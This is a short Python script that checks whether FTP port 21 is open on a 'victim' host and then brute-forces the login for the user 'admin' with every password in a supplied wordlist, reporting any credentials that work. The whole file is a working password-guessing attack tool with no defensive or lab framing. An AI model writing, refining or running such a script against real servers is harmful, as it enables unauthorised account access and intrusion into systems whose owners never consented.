#!/usr/bin/python
import ftplib
import sys
import socket
from colorama import Fore, Back, Style


victim = sys.argv[1]
wordlist = sys.argv[2]

#Checking port is open or not:
def scanner():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    status = sock.connect_ex((victim, 21))
    if status == 0:
        print(Fore.BLUE + "Port is Open")
        sock.close()
    else:
        print(Fore.RED + "port is closed!")
        sys.exit()
#Dictonary opening function:
def dictionary(target,passfile):
    try:
        passfile = open(wordlist, 'r')
        for password in passfile.readlines():
            attackftp(target,password)
    except Exception as f:
        print(f)

def attackftp(target, wordlist):
    try:
        ftp=ftplib.FTP(target)
        user ='admin'
        password = wordlist.strip('\r').strip('\n')
        print(Fore.RED + 'Attacking with: ' +user+ " " + password)
        ftp.login(user,password)
        ftp.quit()
        print(Fore.GREEN+ 'Login Creds Found '+ user+" "+ password)
        return (user, wordlist)
    except Exception as f:
        print("Wrong Creds!")
        return(None, None)

scanner()
dictionary(victim,wordlist)
